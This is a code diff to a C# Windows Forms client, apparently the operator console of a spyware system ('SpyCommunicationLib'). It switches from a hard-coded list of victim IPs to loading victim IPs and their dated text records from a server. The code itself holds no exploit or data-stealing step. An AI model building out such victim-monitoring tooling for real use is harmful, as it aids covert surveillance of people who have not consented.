@@ -1,6 +1,8 @@
 ﻿using SpyCommunicationLib;
+using SpyCommunicationLib.Entities;
 using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Windows.Forms;
 
 namespace ClientInterface
@@ -16,23 +18,17 @@ namespace ClientInterface
             InitializeComponent();
             _loginForm = loginForm;
             _clientService = clientService;
-            InitializeMenu();
-            allVictims = new List<string>
-            {
-                "192.168.1.1",
-                "192.168.1.2",
-                "192.168.1.3",
-                "10.0.0.1",
-                "10.0.0.2"
-            };
-            LoadVictims();
-            button3.Visible = false;
 
-            listBox1.SelectedIndexChanged += ListBox_SelectedIndexChanged;
-            listBox2.SelectedIndexChanged += ListBox_SelectedIndexChanged;
-            button2.Click += button2_Click;
+            InitializeMenu();
+
+            listBox1.SelectedIndexChanged += ListBox1_SelectedIndexChanged;
             button1.Click += button1_Click;
+            button2.Click += button2_Click;
             button3.Click += button3_Click;
+
+            button3.Visible = true;
+
+            LoadVictimsFromServer();
         }
 
         private void InitializeMenu()
@@ -55,55 +51,71 @@ namespace ClientInterface
             _loginForm.Show();
         }
 
-        private void LoadVictims()
+        private async void LoadVictimsFromServer()
         {
             listBox1.Items.Clear();
-            foreach (var victim in allVictims)
-                listBox1.Items.Add(victim);
+            listBox2.Items.Clear();
+
+            var victims = await _clientService.GetVictimIpListAsync();
+            if (victims == null)
+            {
+                MessageBox.Show("Not managed to load victims.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            allVictims = victims.ToList();
+
+            foreach (var ip in allVictims)
+                listBox1.Items.Add(ip);
         }
 
-        private void button2_Click(object sender, EventArgs e)
+        private async void ListBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
-            LoadVictims();
+            await LoadVictimRecordsAsync();
+        }
+
+        private async void button3_Click(object sender, EventArgs e)
+        {
+            await LoadVictimRecordsAsync();
+        }
+
+        private async Task LoadVictimRecordsAsync()
+        {
             listBox2.Items.Clear();
-            button3.Visible = false;
+
+            if (listBox1.SelectedItem == null)
+                return;
+
+            string selectedIp = listBox1.SelectedItem.ToString();
+
+            var records = await _clientService.GetVictimRecordsAsync(selectedIp);
+            if (records == null)
+            {
+                MessageBox.Show($"Not managed to load records for {selectedIp}.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            foreach (var record in records)
+                listBox2.Items.Add($"{record.Date:yyyy-MM-dd} - {record.Text}");
         }
 
         private void button1_Click(object sender, EventArgs e)
         {
             string searchIp = textBox1.Text.Trim();
+            listBox1.Items.Clear();
             listBox2.Items.Clear();
 
-            if (!string.IsNullOrEmpty(searchIp))
-            {
-                foreach (var victim in allVictims)
-                {
-                    if (victim.Contains(searchIp))
-                        listBox2.Items.Add(victim);
-                }
-            }
+            if (string.IsNullOrEmpty(searchIp))
+                return;
+
+            var filtered = allVictims.Where(ip => ip.Contains(searchIp));
+            foreach (var ip in filtered)
+                listBox1.Items.Add(ip);
         }
 
-        private void ListBox_SelectedIndexChanged(object sender, EventArgs e)
+        private void button2_Click(object sender, EventArgs e)
         {
-            button3.Visible = (listBox1.SelectedItem != null || listBox2.SelectedItem != null);
-        }
-
-        private void button3_Click(object sender, EventArgs e)
-        {
-            string toDelete = null;
-            if (listBox1.SelectedItem != null)
-                toDelete = listBox1.SelectedItem.ToString();
-            else if (listBox2.SelectedItem != null)
-                toDelete = listBox2.SelectedItem.ToString();
-
-            if (toDelete != null)
-            {
-                allVictims.Remove(toDelete);
-                LoadVictims();
-                listBox2.Items.Remove(toDelete);
-                button3.Visible = false;
-            }
+            LoadVictimsFromServer();
         }
     }
 }
